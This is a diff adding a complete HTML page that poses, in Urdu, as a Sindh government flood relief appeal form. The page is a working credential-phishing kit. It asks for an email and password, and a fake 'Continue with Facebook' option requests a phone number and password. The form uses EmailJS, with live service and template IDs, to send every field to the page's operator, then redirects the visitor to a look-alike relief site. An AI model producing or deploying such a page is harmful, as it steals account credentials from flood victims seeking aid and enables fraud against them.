@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title> فلڈ ریلیف اپیل فارم</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 25px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+    }
+    label {
+  display: block;
+  text-align: left;
+}
+    h2 {
+      margin-bottom: 10px;
+      color: #333;
+    }
+    .logo {
+      width: 70px;
+      margin-bottom: 20px;
+    }
+    input, textarea, button {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    button {
+      background: #4CAF50;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    .toggle-btn {
+      background: #2196F3;
+      margin-top: 15px;
+    }
+    .toggle-btn:hover {
+      background: #1976D2;
+    }
+    #part2 {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7-Z3xs0TdvQPhEmrYTzRmDr26iwr-HeT4BQ&s" alt="Logo" class="logo">
+    <h2>فلڈ ریلیف پروگرام کے تحت امداد اور گھر کے لیے اپیل کرنے کے لیے اپنے اکاؤنٹ یا گوگل اکاؤنٹ سے لاگ اِن کریں</h2>
+
+    <form id="myForm">
+      <!-- Part 1 -->
+      <div id="part1">
+        <label for="user_name">Email</label>
+        <input type="text" name="user_name" placeholder="اپنا ای میل درج کریں">
+        <label for="user_email">Password</label>
+        <input type="text" name="user_email" placeholder="اپنا پاس ورڈ درج کریں">
+      </div>
+
+      <!-- Part 2 -->
+      <div id="part2">
+        <label for="userphone">Phone </label>
+        <input type="text" name="user_phone" placeholder="Enter your phone">
+        <label for="user_message">Password</label>
+        <textarea name="user_message" placeholder="Enter your password"></textarea>
+      </div>
+
+      <button type="submit">Log in</button>
+    </form>
+
+    <button class="toggle-btn" onclick="switchToPart2()">Continue with Facebook</button>
+  </div>
+
+  <script>
+    // Init EmailJS
+    (function(){
+      emailjs.init("lOP70A-TcCacjwvM5"); // Public key
+    })();
+
+    // Switch to Part 2 (hide part1, show part2)
+    function switchToPart2() {
+      document.getElementById("part1").style.display = "none";
+      document.getElementById("part2").style.display = "block";
+    }
+
+    // Handle form submission
+    document.getElementById("myForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      emailjs.sendForm("service_ch1laac", "template_7243jwf", this)
+        .then(() => {
+          window.location.href = "https://flood-relief-program-govt-sindh.vercel.app/"; // Redirect after success
+        }, (err) => {
+          console.log("FAILED!", err);
+        });
+    });
+  </script>
+
+</body>
+</html>
